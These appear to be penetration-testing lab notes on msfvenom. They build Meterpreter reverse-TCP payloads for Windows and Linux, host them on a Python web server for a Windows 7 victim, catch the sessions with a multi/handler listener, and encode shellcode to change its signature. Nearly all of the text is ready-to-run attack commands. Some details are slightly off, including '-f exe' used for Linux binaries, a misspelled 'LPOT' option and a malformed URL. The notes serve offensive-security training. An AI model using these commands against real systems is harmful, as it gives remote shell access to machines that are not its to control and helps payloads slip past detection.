# 1 Generating Payloads With Msfvenom

#### Msfvenom Output format
```linux
msfvenom
msfvenom --list payloads
msfvenom --list formats
```

### Generating windows payloads
```linux
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > /home/kali/Desktop/payloadx86.exe 
#OR
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > /home/kali/Desktop/payloadx64.exe 
```
`x86`: for 32 bit O.S.
`-p`: for generating payload
`-f`: specifying the format.


### Generating linux payloads
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > /home/kali/Desktop/linux-payloadx64
#OR
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > /home/kali/Desktop/linux-payloadx86

chmod +x linux-payloadx86
./linux-payloadx86
```
- no need to specify `-a` as we were already mentioning it in payload(`-p).
- Saving it as a Binary only for linux.

##### Setting up webserver:
To host the windows payload file and exploiting windows 7.

```
sudo python -m SimpleHTTPServer 80
```
Also set Listening handler
```
msfconsole
use multi/handler
#Change the payload to x86
set payload windows/meterpreter/reverse_tcp
set LHOST & LPORT
run
```

Now from windows 7 system
Go and search for `http://10.10.10.5/80`
Save the `x86` payload > execute it.

- Now check the msfconsole.
##### Same for Linux
```linux
msfconsole
use multi/handler
#Change the payload to x86
set payload linux/x86/meterpreter/reverse_tcp
set LHOST & LPORT
run
```

# 2 Encoding Payloads With Msfvenom
Encoding is the process of modifying the payload shellcode with the objective of modifying the payload signature.
- Shellcode (shell-code) is a piece of code used as a payload for exploitation.

```
msfvenom --list encoders
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPOT=1234 -e x86
```
`-e`: specifying the encoder
